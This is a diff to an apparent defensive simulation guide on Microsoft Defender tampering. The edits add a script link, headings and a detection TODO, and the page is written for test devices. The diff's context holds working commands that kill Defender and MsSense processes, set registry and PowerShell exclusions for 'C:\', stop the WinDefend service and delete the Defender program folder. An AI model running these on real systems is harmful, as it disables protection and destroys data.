@@ -6,6 +6,10 @@ Endpoint protection tampering refers to attempts by attackers to disable or modi
 
 Run the following commands in PowerShell / Windows Command Prompt on a test device.
 
+> **Note:** Download the [simulation script here](Invoke-DefenderTamperingSimulation.ps1).
+> To execute the simulation run the command `Invoke-DefenderTamperingSimulation.ps1`.
+> To clean up the simulation run the command `Invoke-DefenderTamperingSimulation.ps1 -CleanUp`.
+
 ### EDR Tampering
 
 Microsoft Defender Tampering is a technique where attackers disable or interfere with Microsoft Defender to avoid detection of their malicious tools and activities. This may involve killing Defender processes, modifying registry keys, or blocking updates, which disrupts security scanning and prevents the latest security protections from being applied.
@@ -22,7 +26,7 @@ taskkill /F /IM MsSense.exe
 
 Microsoft Defender AV Tampering is a technique where attackers disable or interfere with Microsoft Defender Antivirus to avoid detection of their malicious tools and activities. This may involve killing Defender processes, modifying registry keys, or blocking updates, which disrupts security scanning and prevents the latest security protections from being applied.
 
-Attempt to disable using PowerShell
+#### Attempt to disable using PowerShell
 
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -30,7 +34,7 @@ Set-MpPreference -MAPSReporting 0
 Set-MpPreference -ExclusionExtension "exe" -ExclusionPath "C:\"
 ```
 
-Attempt to disable using Registry Keys
+#### Attempt to disable using Registry Keys
 
 ```powershell
 reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
@@ -39,21 +43,19 @@ reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extens
 reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\\" /t REG_SZ /d "" /f
 ```
 
-Attempt to disable using command
+#### Attempt to disable using command
 
 ```powershell
 sc stop WinDefend
 net stop WinDefend
 ```
 
-Attempt to disable by killing tasks
+#### Attempt to disable by killing tasks
 
 ```powershell
 taskkill /IM MsMpEng.exe /F
 rmdir /s /q "C:\Program Files\Windows Defender"
 ```
-
-> *Script:* [download](Invoke-DefenderTamperingSimulation.ps1)
 
 ## Cleanup
 
@@ -69,3 +71,5 @@ reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Pat
 ```
 
 ## Detection
+
+[ ] TODO: Add detections from this test
